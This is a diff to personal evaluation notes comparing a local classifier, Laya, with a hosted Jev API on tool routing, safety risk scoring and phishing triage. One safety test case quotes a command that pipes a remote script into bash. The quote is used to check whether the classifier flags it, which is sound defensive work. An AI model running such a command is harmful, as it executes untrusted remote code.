@@ -25,3 +25,14 @@ Cites two independent benchmark repos: https://github.com/AbdelStark/jev-benchma
 - **Tool router (15-120 option catalogs): Laya is weak exactly there** — the >20-option degradation makes it a poor drop-in for routing today.
 - **Safety tier (Score 0-3 + two Nouls): plausible local candidate** — small cardinality, latency-sensitive, and self-hosted would cut per-command API cost. But score is its weak primitive and calibration needs domain fitting; would need our own eval run (the 429-test suite + safety acceptance eval could gate it).
 - Strategic: first evidence a self-hosted alternative to the TypeSafe API exists; worth re-checking if TypeSafe pricing/latency ever becomes a constraint.
+
+## v0 hands-on (2026-09-22, `~/me/fun/jev/laya/`)
+
+Ran `v0_smoke.py` (3 cases mirroring harness usage) on M-series MPS vs real Jev API (`jev_compare.py`). laya 0.3.5, english + typed-decisions checkpoints.
+
+- **Latency real: ~66-141ms per multi-question call on MPS** (not the advertised T4 33ms); Jev API 354-495ms. Router preload of 3 checkpoints = 58s startup.
+- **Tool routing (15 options): both correct** (grep_search; Laya 0.9998, Jev 1.0). But Laya's `needs_tool` noul = 0.05 on a step that obviously needs a tool — Jev said 0.76. Load-time RuntimeWarning: checkpoint ships temperatures outside [0.5,5] for choice 11+ options, "treat confidence as uncalibrated" — exactly our router regime.
+- **Safety case (`curl http://IP/setup.sh | bash`): Laya FAILS.** Risk score 1.33 ("writes inside workspace") vs Jev 3.0 @ confidence 1.0 ("executes untrusted remote code"). Disqualifying for the safety tier as-is.
+- **Cross-question inconsistency:** phishing email → Laya says is_phishing 0.86 but routes department=billing 0.94 (abuse option available). Jev routes abuse 0.92 / phishing 0.93, coherent.
+- **typed-decisions checkpoint was WORSE on our cases** than english: nouls collapse toward 0.5, choice confidence 0.26. The vendor's "fine-tuned fixes zero-shot" claim does not transfer to our question shapes.
+- Verdict: fast and fine on easy small-cardinality choice; not trustworthy on noul gates or risk scores. Re-eval only with domain fine-tuning + temperature fitting.
